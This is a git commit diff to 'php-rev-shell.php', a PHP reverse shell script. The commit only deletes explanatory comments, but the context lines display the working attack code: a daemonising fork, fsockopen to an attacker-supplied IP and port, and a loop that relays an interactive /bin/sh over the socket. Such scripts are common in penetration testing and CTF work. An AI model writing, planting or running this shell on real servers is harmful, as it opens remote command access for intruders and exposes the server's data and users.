9d6b01c47557f3e3e0f78c27702650e324728b5e
Raj Chowdhury <30806882+Rajchowdhury420@users.noreply.github.com>
2024-03-16 23:36:55 +0530

    Update php-rev-shell.php

--- php-rev-shell.php
+++ php-rev-shell.php
@@ -10,12 +10,6 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-//
-// Daemonise ourself if possible to avoid zombies later
-//
-
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
 	$pid = pcntl_fork();
@@ -29,8 +23,6 @@ if (function_exists('pcntl_fork')) {
 		exit(0);  // Parent exits
 	}
 
-	// Make the current process a session leader
-	// Will only succeed if we forked
 	if (posix_setsid() == -1) {
 		printit("Error: Can't setsid()");
 		exit(1);
@@ -46,19 +38,12 @@ chdir("/");
 
 // Remove any umask we inherited
 umask(0);
-
-//
-// Do the reverse shell...
-//
-
-// Open reverse connection
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$sock) {
 	printit("$errstr ($errno)");
 	exit(1);
 }
 
-// Spawn shell process
 $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
@@ -72,8 +57,6 @@ if (!is_resource($process)) {
 	exit(1);
 }
 
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
 stream_set_blocking($pipes[0], 0);
 stream_set_blocking($pipes[1], 0);
 stream_set_blocking($pipes[2], 0);
@@ -94,13 +77,8 @@ while (1) {
 		break;
 	}
 
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
 	$read_a = array($sock, $pipes[1], $pipes[2]);
 	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-	// If we can read from the TCP socket, send
-	// data to process's STDIN
 	if (in_array($sock, $read_a)) {
 		if ($debug) printit("SOCK READ");
 		$input = fread($sock, $chunk_size);
@@ -108,8 +86,6 @@ while (1) {
 		fwrite($pipes[0], $input);
 	}
 
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
 	if (in_array($pipes[1], $read_a)) {
 		if ($debug) printit("STDOUT READ");
 		$input = fread($pipes[1], $chunk_size);
@@ -117,8 +93,6 @@ while (1) {
 		fwrite($sock, $input);
 	}
 
-	// If we can read from the process's STDERR
-	// send data down tcp connection
 	if (in_array($pipes[2], $read_a)) {
 		if ($debug) printit("STDERR READ");
 		$input = fread($pipes[2], $chunk_size);
@@ -132,13 +106,9 @@ fclose($pipes[0]);
 fclose($pipes[1]);
 fclose($pipes[2]);
 proc_close($process);
-
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
 function printit ($string) {
 	if (!$daemon) {
 		print "$string\n";
 	}
 }
-
-?> 
+?>
